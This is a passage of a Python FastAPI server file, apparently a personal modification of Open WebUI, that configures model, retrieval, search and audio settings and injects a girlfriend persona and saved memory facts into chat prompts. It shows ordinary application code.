# MY IMPORTS FROM DATA FOLDER
#
import ai_memory #loads the ai_memory.py from the data folder

#Connect to memory.db
#Create tables if they’re missing
#Confirm everything’s wired up
try:
    ai_memory.initialize()
    print(""\n\n✅ Memory DB initialized.\n\n"")
except Exception as e:
    print(f""\n\n❌ Failed to initialize memory DB: {e}\n\n"")


PERSONALITY_FILE = os.path.join(BASE_DIR, ""personality.txt"")

try:
    with open(PERSONALITY_FILE, ""r"", encoding=""utf-8"") as f:        
        personality = f.read()
        print(f""️\nperonality.txt Read SUCCESSFULLY!\n"")
except Exception as e:
    personality = ""You are Richards girlfriend.""
    print(f""⚠️ Could not load personality.txt: {e}"")

@asynccontextmanager
async def lifespan(app: FastAPI):
    start_logger()
    if RESET_CONFIG_ON_START:
        reset_config()

    if LICENSE_KEY:
        get_license_data(app, LICENSE_KEY)

    asyncio.create_task(periodic_usage_pool_cleanup())
    yield


app = FastAPI(
    title=""Open WebUI"",
    docs_url=""/docs"" if ENV == ""dev"" else None,
    openapi_url=""/openapi.json"" if ENV == ""dev"" else None,
    redoc_url=None,
    lifespan=lifespan,
)

oauth_manager = OAuthManager(app)

app.state.config = AppConfig(
    redis_url=REDIS_URL,
    redis_sentinels=get_sentinels_from_env(REDIS_SENTINEL_HOSTS, REDIS_SENTINEL_PORT),
)

app.state.WEBUI_NAME = WEBUI_NAME
app.state.LICENSE_METADATA = None


########################################
#
# OPENTELEMETRY
#
########################################

if ENABLE_OTEL:
    from open_webui.utils.telemetry.setup import setup as setup_opentelemetry

    setup_opentelemetry(app=app, db_engine=engine)


########################################
#
# OLLAMA
#
########################################


app.state.config.ENABLE_OLLAMA_API = ENABLE_OLLAMA_API
app.state.config.OLLAMA_BASE_URLS = OLLAMA_BASE_URLS
app.state.config.OLLAMA_API_CONFIGS = OLLAMA_API_CONFIGS

app.state.OLLAMA_MODELS = {}

########################################
#
# OPENAI
#
########################################

app.state.config.ENABLE_OPENAI_API = ENABLE_OPENAI_API
app.state.config.OPENAI_API_BASE_URLS = OPENAI_API_BASE_URLS
app.state.config.OPENAI_API_KEYS = OPENAI_API_KEYS
app.state.config.OPENAI_API_CONFIGS = OPENAI_API_CONFIGS

app.state.OPENAI_MODELS = {}

########################################
#
# TOOL SERVERS
#
########################################

app.state.config.TOOL_SERVER_CONNECTIONS = TOOL_SERVER_CONNECTIONS
app.state.TOOL_SERVERS = []

########################################
#
# DIRECT CONNECTIONS
#
########################################

app.state.config.ENABLE_DIRECT_CONNECTIONS = ENABLE_DIRECT_CONNECTIONS

########################################
#
# WEBUI
#
########################################

app.state.config.WEBUI_URL = WEBUI_URL
app.state.config.ENABLE_SIGNUP = ENABLE_SIGNUP
app.state.config.ENABLE_LOGIN_FORM = ENABLE_LOGIN_FORM

app.state.config.ENABLE_API_KEY = ENABLE_API_KEY
app.state.config.ENABLE_API_KEY_ENDPOINT_RESTRICTIONS = (
    ENABLE_API_KEY_ENDPOINT_RESTRICTIONS
)
app.state.config.API_KEY_ALLOWED_ENDPOINTS = API_KEY_ALLOWED_ENDPOINTS

app.state.config.JWT_EXPIRES_IN = JWT_EXPIRES_IN

app.state.config.SHOW_ADMIN_DETAILS = SHOW_ADMIN_DETAILS
app.state.config.ADMIN_EMAIL = ADMIN_EMAIL


app.state.config.DEFAULT_MODELS = DEFAULT_MODELS
app.state.config.DEFAULT_PROMPT_SUGGESTIONS = DEFAULT_PROMPT_SUGGESTIONS
app.state.config.DEFAULT_USER_ROLE = DEFAULT_USER_ROLE

app.state.config.USER_PERMISSIONS = USER_PERMISSIONS
app.state.config.WEBHOOK_URL = WEBHOOK_URL
app.state.config.BANNERS = WEBUI_BANNERS
app.state.config.MODEL_ORDER_LIST = MODEL_ORDER_LIST


app.state.config.ENABLE_CHANNELS = ENABLE_CHANNELS
app.state.config.ENABLE_COMMUNITY_SHARING = ENABLE_COMMUNITY_SHARING
app.state.config.ENABLE_MESSAGE_RATING = ENABLE_MESSAGE_RATING
app.state.config.ENABLE_USER_WEBHOOKS = ENABLE_USER_WEBHOOKS

app.state.config.ENABLE_EVALUATION_ARENA_MODELS = ENABLE_EVALUATION_ARENA_MODELS
app.state.config.EVALUATION_ARENA_MODELS = EVALUATION_ARENA_MODELS

app.state.config.OAUTH_USERNAME_CLAIM = OAUTH_USERNAME_CLAIM
app.state.config.OAUTH_PICTURE_CLAIM = OAUTH_PICTURE_CLAIM
app.state.config.OAUTH_EMAIL_CLAIM = OAUTH_EMAIL_CLAIM

app.state.config.ENABLE_OAUTH_ROLE_MANAGEMENT = ENABLE_OAUTH_ROLE_MANAGEMENT
app.state.config.OAUTH_ROLES_CLAIM = OAUTH_ROLES_CLAIM
app.state.config.OAUTH_ALLOWED_ROLES = OAUTH_ALLOWED_ROLES
app.state.config.OAUTH_ADMIN_ROLES = OAUTH_ADMIN_ROLES

app.state.config.ENABLE_LDAP = ENABLE_LDAP
app.state.config.LDAP_SERVER_LABEL = LDAP_SERVER_LABEL
app.state.config.LDAP_SERVER_HOST = LDAP_SERVER_HOST
app.state.config.LDAP_SERVER_PORT = LDAP_SERVER_PORT
app.state.config.LDAP_ATTRIBUTE_FOR_MAIL = LDAP_ATTRIBUTE_FOR_MAIL
app.state.config.LDAP_ATTRIBUTE_FOR_USERNAME = LDAP_ATTRIBUTE_FOR_USERNAME
app.state.config.LDAP_APP_DN = LDAP_APP_DN
app.state.config.LDAP_APP_PASSWORD = LDAP_APP_PASSWORD
app.state.config.LDAP_SEARCH_BASE = LDAP_SEARCH_BASE
app.state.config.LDAP_SEARCH_FILTERS = LDAP_SEARCH_FILTERS
app.state.config.LDAP_USE_TLS = LDAP_USE_TLS
app.state.config.LDAP_CA_CERT_FILE = LDAP_CA_CERT_FILE
app.state.config.LDAP_CIPHERS = LDAP_CIPHERS


app.state.AUTH_TRUSTED_EMAIL_HEADER = WEBUI_AUTH_TRUSTED_EMAIL_HEADER
app.state.AUTH_TRUSTED_NAME_HEADER = WEBUI_AUTH_TRUSTED_NAME_HEADER
app.state.EXTERNAL_PWA_MANIFEST_URL = EXTERNAL_PWA_MANIFEST_URL

app.state.USER_COUNT = None
app.state.TOOLS = {}
app.state.FUNCTIONS = {}

########################################
#
# RETRIEVAL
#
########################################


app.state.config.TOP_K = RAG_TOP_K
app.state.config.TOP_K_RERANKER = RAG_TOP_K_RERANKER
app.state.config.RELEVANCE_THRESHOLD = RAG_RELEVANCE_THRESHOLD
app.state.config.FILE_MAX_SIZE = RAG_FILE_MAX_SIZE
app.state.config.FILE_MAX_COUNT = RAG_FILE_MAX_COUNT


app.state.config.RAG_FULL_CONTEXT = RAG_FULL_CONTEXT
app.state.config.BYPASS_EMBEDDING_AND_RETRIEVAL = BYPASS_EMBEDDING_AND_RETRIEVAL
app.state.config.ENABLE_RAG_HYBRID_SEARCH = ENABLE_RAG_HYBRID_SEARCH
app.state.config.ENABLE_WEB_LOADER_SSL_VERIFICATION = ENABLE_WEB_LOADER_SSL_VERIFICATION

app.state.config.CONTENT_EXTRACTION_ENGINE = CONTENT_EXTRACTION_ENGINE
app.state.config.TIKA_SERVER_URL = TIKA_SERVER_URL
app.state.config.DOCLING_SERVER_URL = DOCLING_SERVER_URL
app.state.config.DOCUMENT_INTELLIGENCE_ENDPOINT = DOCUMENT_INTELLIGENCE_ENDPOINT
app.state.config.DOCUMENT_INTELLIGENCE_KEY = DOCUMENT_INTELLIGENCE_KEY
app.state.config.MISTRAL_OCR_API_KEY = MISTRAL_OCR_API_KEY

app.state.config.TEXT_SPLITTER = RAG_TEXT_SPLITTER
app.state.config.TIKTOKEN_ENCODING_NAME = TIKTOKEN_ENCODING_NAME

app.state.config.CHUNK_SIZE = CHUNK_SIZE
app.state.config.CHUNK_OVERLAP = CHUNK_OVERLAP

app.state.config.RAG_EMBEDDING_ENGINE = RAG_EMBEDDING_ENGINE
app.state.config.RAG_EMBEDDING_MODEL = RAG_EMBEDDING_MODEL
app.state.config.RAG_EMBEDDING_BATCH_SIZE = RAG_EMBEDDING_BATCH_SIZE
app.state.config.RAG_RERANKING_MODEL = RAG_RERANKING_MODEL
app.state.config.RAG_TEMPLATE = RAG_TEMPLATE

app.state.config.RAG_OPENAI_API_BASE_URL = RAG_OPENAI_API_BASE_URL
app.state.config.RAG_OPENAI_API_KEY = RAG_OPENAI_API_KEY

app.state.config.RAG_OLLAMA_BASE_URL = RAG_OLLAMA_BASE_URL
app.state.config.RAG_OLLAMA_API_KEY = RAG_OLLAMA_API_KEY

app.state.config.PDF_EXTRACT_IMAGES = PDF_EXTRACT_IMAGES

app.state.config.YOUTUBE_LOADER_LANGUAGE = YOUTUBE_LOADER_LANGUAGE
app.state.config.YOUTUBE_LOADER_PROXY_URL = YOUTUBE_LOADER_PROXY_URL


app.state.config.ENABLE_WEB_SEARCH = ENABLE_WEB_SEARCH
app.state.config.WEB_SEARCH_ENGINE = WEB_SEARCH_ENGINE
app.state.config.WEB_SEARCH_DOMAIN_FILTER_LIST = WEB_SEARCH_DOMAIN_FILTER_LIST
app.state.config.WEB_SEARCH_RESULT_COUNT = WEB_SEARCH_RESULT_COUNT
app.state.config.WEB_SEARCH_CONCURRENT_REQUESTS = WEB_SEARCH_CONCURRENT_REQUESTS
app.state.config.WEB_LOADER_ENGINE = WEB_LOADER_ENGINE
app.state.config.WEB_SEARCH_TRUST_ENV = WEB_SEARCH_TRUST_ENV
app.state.config.BYPASS_WEB_SEARCH_EMBEDDING_AND_RETRIEVAL = (
    BYPASS_WEB_SEARCH_EMBEDDING_AND_RETRIEVAL
)

app.state.config.ENABLE_GOOGLE_DRIVE_INTEGRATION = ENABLE_GOOGLE_DRIVE_INTEGRATION
app.state.config.ENABLE_ONEDRIVE_INTEGRATION = ENABLE_ONEDRIVE_INTEGRATION
app.state.config.SEARXNG_QUERY_URL = SEARXNG_QUERY_URL
app.state.config.GOOGLE_PSE_API_KEY = GOOGLE_PSE_API_KEY
app.state.config.GOOGLE_PSE_ENGINE_ID = GOOGLE_PSE_ENGINE_ID
app.state.config.BRAVE_SEARCH_API_KEY = BRAVE_SEARCH_API_KEY
app.state.config.KAGI_SEARCH_API_KEY = KAGI_SEARCH_API_KEY
app.state.config.MOJEEK_SEARCH_API_KEY = MOJEEK_SEARCH_API_KEY
app.state.config.BOCHA_SEARCH_API_KEY = BOCHA_SEARCH_API_KEY
app.state.config.SERPSTACK_API_KEY = SERPSTACK_API_KEY
app.state.config.SERPSTACK_HTTPS = SERPSTACK_HTTPS
app.state.config.SERPER_API_KEY = SERPER_API_KEY
app.state.config.SERPLY_API_KEY = SERPLY_API_KEY
app.state.config.TAVILY_API_KEY = TAVILY_API_KEY
app.state.config.SEARCHAPI_API_KEY = SEARCHAPI_API_KEY
app.state.config.SEARCHAPI_ENGINE = SEARCHAPI_ENGINE
app.state.config.SERPAPI_API_KEY = SERPAPI_API_KEY
app.state.config.SERPAPI_ENGINE = SERPAPI_ENGINE
app.state.config.JINA_API_KEY = JINA_API_KEY
app.state.config.BING_SEARCH_V7_ENDPOINT = BING_SEARCH_V7_ENDPOINT
app.state.config.BING_SEARCH_V7_SUBSCRIPTION_KEY = BING_SEARCH_V7_SUBSCRIPTION_KEY
app.state.config.EXA_API_KEY = EXA_API_KEY
app.state.config.PERPLEXITY_API_KEY = PERPLEXITY_API_KEY
app.state.config.SOUGOU_API_SID = SOUGOU_API_SID
app.state.config.SOUGOU_API_SK = SOUGOU_API_SK


app.state.config.PLAYWRIGHT_WS_URL = PLAYWRIGHT_WS_URL
app.state.config.PLAYWRIGHT_TIMEOUT = PLAYWRIGHT_TIMEOUT
app.state.config.FIRECRAWL_API_BASE_URL = FIRECRAWL_API_BASE_URL
app.state.config.FIRECRAWL_API_KEY = FIRECRAWL_API_KEY
app.state.config.TAVILY_EXTRACT_DEPTH = TAVILY_EXTRACT_DEPTH

app.state.EMBEDDING_FUNCTION = None
app.state.ef = None
app.state.rf = None

app.state.YOUTUBE_LOADER_TRANSLATION = None


try:
    app.state.ef = get_ef(
        app.state.config.RAG_EMBEDDING_ENGINE,
        app.state.config.RAG_EMBEDDING_MODEL,
        RAG_EMBEDDING_MODEL_AUTO_UPDATE,
    )

    app.state.rf = get_rf(
        app.state.config.RAG_RERANKING_MODEL,
        RAG_RERANKING_MODEL_AUTO_UPDATE,
    )
except Exception as e:
    log.error(f""Error updating models: {e}"")
    pass


app.state.EMBEDDING_FUNCTION = get_embedding_function(
    app.state.config.RAG_EMBEDDING_ENGINE,
    app.state.config.RAG_EMBEDDING_MODEL,
    app.state.ef,
    (
        app.state.config.RAG_OPENAI_API_BASE_URL
        if app.state.config.RAG_EMBEDDING_ENGINE == ""openai""
        else app.state.config.RAG_OLLAMA_BASE_URL
    ),
    (
        app.state.config.RAG_OPENAI_API_KEY
        if app.state.config.RAG_EMBEDDING_ENGINE == ""openai""
        else app.state.config.RAG_OLLAMA_API_KEY
    ),
    app.state.config.RAG_EMBEDDING_BATCH_SIZE,
)

########################################
#
# CODE EXECUTION
#
########################################

app.state.config.ENABLE_CODE_EXECUTION = ENABLE_CODE_EXECUTION
app.state.config.CODE_EXECUTION_ENGINE = CODE_EXECUTION_ENGINE
app.state.config.CODE_EXECUTION_JUPYTER_URL = CODE_EXECUTION_JUPYTER_URL
app.state.config.CODE_EXECUTION_JUPYTER_AUTH = CODE_EXECUTION_JUPYTER_AUTH
app.state.config.CODE_EXECUTION_JUPYTER_AUTH_TOKEN = CODE_EXECUTION_JUPYTER_AUTH_TOKEN
app.state.config.CODE_EXECUTION_JUPYTER_AUTH_PASSWORD = (
    CODE_EXECUTION_JUPYTER_AUTH_PASSWORD
)
app.state.config.CODE_EXECUTION_JUPYTER_TIMEOUT = CODE_EXECUTION_JUPYTER_TIMEOUT

app.state.config.ENABLE_CODE_INTERPRETER = ENABLE_CODE_INTERPRETER
app.state.config.CODE_INTERPRETER_ENGINE = CODE_INTERPRETER_ENGINE
app.state.config.CODE_INTERPRETER_PROMPT_TEMPLATE = CODE_INTERPRETER_PROMPT_TEMPLATE

app.state.config.CODE_INTERPRETER_JUPYTER_URL = CODE_INTERPRETER_JUPYTER_URL
app.state.config.CODE_INTERPRETER_JUPYTER_AUTH = CODE_INTERPRETER_JUPYTER_AUTH
app.state.config.CODE_INTERPRETER_JUPYTER_AUTH_TOKEN = (
    CODE_INTERPRETER_JUPYTER_AUTH_TOKEN
)
app.state.config.CODE_INTERPRETER_JUPYTER_AUTH_PASSWORD = (
    CODE_INTERPRETER_JUPYTER_AUTH_PASSWORD
)
app.state.config.CODE_INTERPRETER_JUPYTER_TIMEOUT = CODE_INTERPRETER_JUPYTER_TIMEOUT

########################################
#
# IMAGES
#
########################################

app.state.config.IMAGE_GENERATION_ENGINE = IMAGE_GENERATION_ENGINE
app.state.config.ENABLE_IMAGE_GENERATION = ENABLE_IMAGE_GENERATION
app.state.config.ENABLE_IMAGE_PROMPT_GENERATION = ENABLE_IMAGE_PROMPT_GENERATION

app.state.config.IMAGES_OPENAI_API_BASE_URL = IMAGES_OPENAI_API_BASE_URL
app.state.config.IMAGES_OPENAI_API_KEY = IMAGES_OPENAI_API_KEY

app.state.config.IMAGES_GEMINI_API_BASE_URL = IMAGES_GEMINI_API_BASE_URL
app.state.config.IMAGES_GEMINI_API_KEY = IMAGES_GEMINI_API_KEY

app.state.config.IMAGE_GENERATION_MODEL = IMAGE_GENERATION_MODEL

app.state.config.AUTOMATIC1111_BASE_URL = AUTOMATIC1111_BASE_URL
app.state.config.AUTOMATIC1111_API_AUTH = AUTOMATIC1111_API_AUTH
app.state.config.AUTOMATIC1111_CFG_SCALE = AUTOMATIC1111_CFG_SCALE
app.state.config.AUTOMATIC1111_SAMPLER = AUTOMATIC1111_SAMPLER
app.state.config.AUTOMATIC1111_SCHEDULER = AUTOMATIC1111_SCHEDULER
app.state.config.COMFYUI_BASE_URL = COMFYUI_BASE_URL
app.state.config.COMFYUI_API_KEY = COMFYUI_API_KEY
app.state.config.COMFYUI_WORKFLOW = COMFYUI_WORKFLOW
app.state.config.COMFYUI_WORKFLOW_NODES = COMFYUI_WORKFLOW_NODES

app.state.config.IMAGE_SIZE = IMAGE_SIZE
app.state.config.IMAGE_STEPS = IMAGE_STEPS


########################################
#
# AUDIO
#
########################################

app.state.config.STT_OPENAI_API_BASE_URL = AUDIO_STT_OPENAI_API_BASE_URL
app.state.config.STT_OPENAI_API_KEY = AUDIO_STT_OPENAI_API_KEY
app.state.config.STT_ENGINE = AUDIO_STT_ENGINE
app.state.config.STT_MODEL = AUDIO_STT_MODEL

app.state.config.WHISPER_MODEL = WHISPER_MODEL
app.state.config.WHISPER_VAD_FILTER = WHISPER_VAD_FILTER
app.state.config.DEEPGRAM_API_KEY = DEEPGRAM_API_KEY

app.state.config.AUDIO_STT_AZURE_API_KEY = AUDIO_STT_AZURE_API_KEY
app.state.config.AUDIO_STT_AZURE_REGION = AUDIO_STT_AZURE_REGION
app.state.config.AUDIO_STT_AZURE_LOCALES = AUDIO_STT_AZURE_LOCALES

app.state.config.TTS_OPENAI_API_BASE_URL = AUDIO_TTS_OPENAI_API_BASE_URL
app.state.config.TTS_OPENAI_API_KEY = AUDIO_TTS_OPENAI_API_KEY
app.state.config.TTS_ENGINE = AUDIO_TTS_ENGINE
app.state.config.TTS_MODEL = AUDIO_TTS_MODEL
app.state.config.TTS_VOICE = AUDIO_TTS_VOICE
app.state.config.TTS_API_KEY = AUDIO_TTS_API_KEY
app.state.config.TTS_SPLIT_ON = AUDIO_TTS_SPLIT_ON


app.state.config.TTS_AZURE_SPEECH_REGION = AUDIO_TTS_AZURE_SPEECH_REGION
app.state.config.TTS_AZURE_SPEECH_OUTPUT_FORMAT = AUDIO_TTS_AZURE_SPEECH_OUTPUT_FORMAT


app.state.faster_whisper_model = None
app.state.speech_synthesiser = None
app.state.speech_speaker_embeddings_dataset = None


########################################
#
# TASKS
#
########################################


app.state.config.TASK_MODEL = TASK_MODEL
app.state.config.TASK_MODEL_EXTERNAL = TASK_MODEL_EXTERNAL


app.state.config.ENABLE_SEARCH_QUERY_GENERATION = ENABLE_SEARCH_QUERY_GENERATION
app.state.config.ENABLE_RETRIEVAL_QUERY_GENERATION = ENABLE_RETRIEVAL_QUERY_GENERATION
app.state.config.ENABLE_AUTOCOMPLETE_GENERATION = ENABLE_AUTOCOMPLETE_GENERATION
app.state.config.ENABLE_TAGS_GENERATION = ENABLE_TAGS_GENERATION
app.state.config.ENABLE_TITLE_GENERATION = ENABLE_TITLE_GENERATION


app.state.config.TITLE_GENERATION_PROMPT_TEMPLATE = TITLE_GENERATION_PROMPT_TEMPLATE
app.state.config.TAGS_GENERATION_PROMPT_TEMPLATE = TAGS_GENERATION_PROMPT_TEMPLATE
app.state.config.IMAGE_PROMPT_GENERATION_PROMPT_TEMPLATE = (
    IMAGE_PROMPT_GENERATION_PROMPT_TEMPLATE
)

app.state.config.TOOLS_FUNCTION_CALLING_PROMPT_TEMPLATE = (
    TOOLS_FUNCTION_CALLING_PROMPT_TEMPLATE
)
app.state.config.QUERY_GENERATION_PROMPT_TEMPLATE = QUERY_GENERATION_PROMPT_TEMPLATE
app.state.config.AUTOCOMPLETE_GENERATION_PROMPT_TEMPLATE = (
    AUTOCOMPLETE_GENERATION_PROMPT_TEMPLATE
)
app.state.config.AUTOCOMPLETE_GENERATION_INPUT_MAX_LENGTH = (
    AUTOCOMPLETE_GENERATION_INPUT_MAX_LENGTH
)


########################################
#
# WEBUI
#
########################################

app.state.MODELS = {}


class RedirectMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        # Check if the request is a GET request
        if request.method == ""GET"":
            path = request.url.path
            query_params = dict(parse_qs(urlparse(str(request.url)).query))

            # Check for the specific watch path and the presence of 'v' parameter
            if path.endswith(""/watch"") and ""v"" in query_params:
                video_id = query_params[""v""][0]  # Extract the first 'v' parameter
                encoded_video_id = urlencode({""youtube"": video_id})
                redirect_url = f""/?{encoded_video_id}""
                return RedirectResponse(url=redirect_url)

        # Proceed with the normal flow of other requests
        response = await call_next(request)
        return response


# Add the middleware to the app
app.add_middleware(RedirectMiddleware)
app.add_middleware(SecurityHeadersMiddleware)


@app.middleware(""http"")
async def commit_session_after_request(request: Request, call_next):
    response = await call_next(request)
    # log.debug(""Commit session after request"")
    Session.commit()
    return response


@app.middleware(""http"")
async def check_url(request: Request, call_next):
    start_time = int(time.time())
    request.state.token = get_http_authorization_cred(
        request.headers.get(""Authorization"")
    )

    request.state.enable_api_key = app.state.config.ENABLE_API_KEY
    response = await call_next(request)
    process_time = int(time.time()) - start_time
    response.headers[""X-Process-Time""] = str(process_time)
    return response


@app.middleware(""http"")
async def inspect_websocket(request: Request, call_next):
    if (
        ""/ws/socket.io"" in request.url.path
        and request.query_params.get(""transport"") == ""websocket""
    ):
        upgrade = (request.headers.get(""Upgrade"") or """").lower()
        connection = (request.headers.get(""Connection"") or """").lower().split("","")
        # Check that there's the correct headers for an upgrade, else reject the connection
        # This is to work around this upstream issue: https://github.com/miguelgrinberg/python-engineio/issues/367
        if upgrade != ""websocket"" or ""upgrade"" not in connection:
            return JSONResponse(
                status_code=status.HTTP_400_BAD_REQUEST,
                content={""detail"": ""Invalid WebSocket upgrade request""},
            )
    return await call_next(request)


app.add_middleware(
    CORSMiddleware,
    allow_origins=CORS_ALLOW_ORIGIN,
    allow_credentials=True,
    allow_methods=[""*""],
    allow_headers=[""*""],
)


app.mount(""/ws"", socket_app)


app.include_router(ollama.router, prefix=""/ollama"", tags=[""ollama""])
app.include_router(openai.router, prefix=""/openai"", tags=[""openai""])


app.include_router(pipelines.router, prefix=""/api/v1/pipelines"", tags=[""pipelines""])
app.include_router(tasks.router, prefix=""/api/v1/tasks"", tags=[""tasks""])
app.include_router(images.router, prefix=""/api/v1/images"", tags=[""images""])

app.include_router(audio.router, prefix=""/api/v1/audio"", tags=[""audio""])
app.include_router(retrieval.router, prefix=""/api/v1/retrieval"", tags=[""retrieval""])

app.include_router(configs.router, prefix=""/api/v1/configs"", tags=[""configs""])

app.include_router(auths.router, prefix=""/api/v1/auths"", tags=[""auths""])
app.include_router(users.router, prefix=""/api/v1/users"", tags=[""users""])


app.include_router(channels.router, prefix=""/api/v1/channels"", tags=[""channels""])
app.include_router(chats.router, prefix=""/api/v1/chats"", tags=[""chats""])

app.include_router(models.router, prefix=""/api/v1/models"", tags=[""models""])
app.include_router(knowledge.router, prefix=""/api/v1/knowledge"", tags=[""knowledge""])
app.include_router(prompts.router, prefix=""/api/v1/prompts"", tags=[""prompts""])
app.include_router(tools.router, prefix=""/api/v1/tools"", tags=[""tools""])

app.include_router(memories.router, prefix=""/api/v1/memories"", tags=[""memories""])
app.include_router(folders.router, prefix=""/api/v1/folders"", tags=[""folders""])
app.include_router(groups.router, prefix=""/api/v1/groups"", tags=[""groups""])
app.include_router(files.router, prefix=""/api/v1/files"", tags=[""files""])
app.include_router(functions.router, prefix=""/api/v1/functions"", tags=[""functions""])
app.include_router(
    evaluations.router, prefix=""/api/v1/evaluations"", tags=[""evaluations""]
)
app.include_router(utils.router, prefix=""/api/v1/utils"", tags=[""utils""])


try:
    audit_level = AuditLevel(AUDIT_LOG_LEVEL)
except ValueError as e:
    logger.error(f""Invalid audit level: {AUDIT_LOG_LEVEL}. Error: {e}"")
    audit_level = AuditLevel.NONE

if audit_level != AuditLevel.NONE:
    app.add_middleware(
        AuditLoggingMiddleware,
        audit_level=audit_level,
        excluded_paths=AUDIT_EXCLUDED_PATHS,
        max_body_size=MAX_BODY_LOG_SIZE,
    )
##################################
#
# Chat Endpoints
#
##################################


@app.get(""/api/models"")
async def get_models(request: Request, user=Depends(get_verified_user)):
    def get_filtered_models(models, user):
        filtered_models = []
        for model in models:
            if model.get(""arena""):
                if has_access(
                    user.id,
                    type=""read"",
                    access_control=model.get(""info"", {})
                    .get(""meta"", {})
                    .get(""access_control"", {}),
                ):
                    filtered_models.append(model)
                continue

            model_info = Models.get_model_by_id(model[""id""])
            if model_info:
                if user.id == model_info.user_id or has_access(
                    user.id, type=""read"", access_control=model_info.access_control
                ):
                    filtered_models.append(model)

        return filtered_models

    all_models = await get_all_models(request, user=user)

    models = []
    for model in all_models:
        # Filter out filter pipelines
        if ""pipeline"" in model and model[""pipeline""].get(""type"", None) == ""filter"":
            continue

        try:
            model_tags = [
                tag.get(""name"")
                for tag in model.get(""info"", {}).get(""meta"", {}).get(""tags"", [])
            ]
            tags = [tag.get(""name"") for tag in model.get(""tags"", [])]

            tags = list(set(model_tags + tags))
            model[""tags""] = [{""name"": tag} for tag in tags]
        except Exception as e:
            log.debug(f""Error processing model tags: {e}"")
            model[""tags""] = []
            pass

        models.append(model)

    model_order_list = request.app.state.config.MODEL_ORDER_LIST
    if model_order_list:
        model_order_dict = {model_id: i for i, model_id in enumerate(model_order_list)}
        # Sort models by order list priority, with fallback for those not in the list
        models.sort(
            key=lambda x: (model_order_dict.get(x[""id""], float(""inf"")), x[""name""])
        )

    # Filter out models that the user does not have access to
    if user.role == ""user"" and not BYPASS_MODEL_ACCESS_CONTROL:
        models = get_filtered_models(models, user)

    log.debug(
        f""/api/models returned filtered models accessible to the user: {json.dumps([model['id'] for model in models])}""
    )
    return {""data"": models}


@app.get(""/api/models/base"")
async def get_base_models(request: Request, user=Depends(get_admin_user)):
    models = await get_all_base_models(request, user=user)
    return {""data"": models}


@app.post(""/api/chat/completions"")
async def chat_completion(
    request: Request,
    form_data: dict,
    user=Depends(get_verified_user),
):
    if not request.app.state.MODELS:
        await get_all_models(request, user=user)

    model_item = form_data.pop(""model_item"", {})
    tasks = form_data.pop(""background_tasks"", None)

    metadata = {}
    try:
        if not model_item.get(""direct"", False):
            model_id = form_data.get(""model"", None)
            if model_id not in request.app.state.MODELS:
                raise Exception(""Model not found"")

            model = request.app.state.MODELS[model_id]
            model_info = Models.get_model_by_id(model_id)

            # Check if user has access to the model
            if not BYPASS_MODEL_ACCESS_CONTROL and user.role == ""user"":
                try:
                    check_model_access(user, model)
                except Exception as e:
                    raise e
        else:
            model = model_item
            model_info = None

            request.state.direct = True
            request.state.model = model

        metadata = {
            ""user_id"": user.id,
            ""chat_id"": form_data.pop(""chat_id"", None),
            ""message_id"": form_data.pop(""id"", None),
            ""session_id"": form_data.pop(""session_id"", None),
            ""tool_ids"": form_data.get(""tool_ids"", None),
            ""tool_servers"": form_data.pop(""tool_servers"", None),
            ""files"": form_data.get(""files"", None),
            ""features"": form_data.get(""features"", None),
            ""variables"": form_data.get(""variables"", None),
            ""model"": model,
            ""direct"": model_item.get(""direct"", False),
            **(
                {""function_calling"": ""native""}
                if form_data.get(""params"", {}).get(""function_calling"") == ""native""
                or (
                    model_info
                    and model_info.params.model_dump().get(""function_calling"")
                    == ""native""
                )
                else {}
            ),
        }

        request.state.metadata = metadata
        form_data[""metadata""] = metadata

        form_data, metadata, events = await process_chat_payload(
            request, form_data, user, metadata, model
        )

    except Exception as e:
        log.debug(f""Error processing chat payload: {e}"")
        if metadata.get(""chat_id"") and metadata.get(""message_id""):
            # Update the chat message with the error
            Chats.upsert_message_to_chat_by_id_and_message_id(
                metadata[""chat_id""],
                metadata[""message_id""],
                {
                    ""error"": {""content"": str(e)},
                },
            )

        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )

    try:
        # [[ MODDED 4/16/25 TO INJECT PERSONALITY ]]
        # [[ -------------------------------------]]
        # Inject personality into system prompt
        # Pull saved memory facts and inject into system prompt
        facts = ai_memory.get_facts()
        fact_lines = [f""{k} is {v}"" for k, v in facts.items()]
        fact_block = ""\n\nHere’s what you know so far:\n- "" + ""\n- "".join(fact_lines) if fact_lines else """"

        system_prompt = personality.strip() + fact_block
        
        # Wake-up primer (gets the AI warmed up with context)
        primer_msg = {
            ""role"": ""user"",
            ""content"": ""This is just a warm-up to help you remember who you are. Please wait for my real question.""
        }
        
        form_data.setdefault(""messages"", [])
        form_data[""messages""].insert(0, primer_msg)
        form_data[""messages""].insert(0, {
            ""role"": ""system"",
            ""content"": system_prompt
        })

            
        # Check if user told the AI to remember something
        user_messages = [msg[""content""] for msg in form_data[""messages""] if msg.get(""role"") == ""user""]
        last_user_msg = user_messages[-1] if user_messages else """"

        if ""remember that"" in last_user_msg.lower():
            try:
                import re
                memory = last_user_msg.lower().split(""remember that"", 1)[1]
                memory = re.sub(r""\\+"", """", memory)  # Remove backslashes
                memory = memory.replace(""’"", ""'"").replace(""“"", ""\"""").replace(""”"", ""\"""")
                memory = memory.replace("" ="", "" is "").replace("" = "", "" is "").strip()

                print(f""\033[96m🧪 Cleaned memory input: {memory}\033[0m"")

                if "" is "" in memory:
                    subject, fact = memory.split("" is "", 1)
                    ai_memory.save_fact(subject.strip(), fact.strip())
                    print(f""\033[92m💾 Remembered: {subject.strip()} = {fact.strip()}\033[0m"")
                else:
                    print(""\033[91m❌ 'is' keyword not found in memory string.\033[0m"")
            except Exception as e:
                print(f""\033[91m⚠️ Failed to save memory: {e}\033[0m"")
                
        response = await chat_completion_handler(request, form_data, user)

        return await process_chat_response(
            request, response, form_data, user, metadata, model, events, tasks
        )
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )


# Alias for chat_completion (Legacy)
generate_chat_completions = chat_completion
generate_chat_completion = chat_completion


@app.post(""/api/chat/completed"")
async def chat_completed(
    request: Request, form_data: dict, user=Depends(get_verified_user)
):
    try:
        model_item = form_data.pop(""model_item"", {})

        if model_item.get(""direct"", False):
            request.state.direct = True
            request.state.model = model_item

        return await chat_completed_handler(request, form_data, user)
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )


@app.post(""/api/chat/actions/{action_id}"")
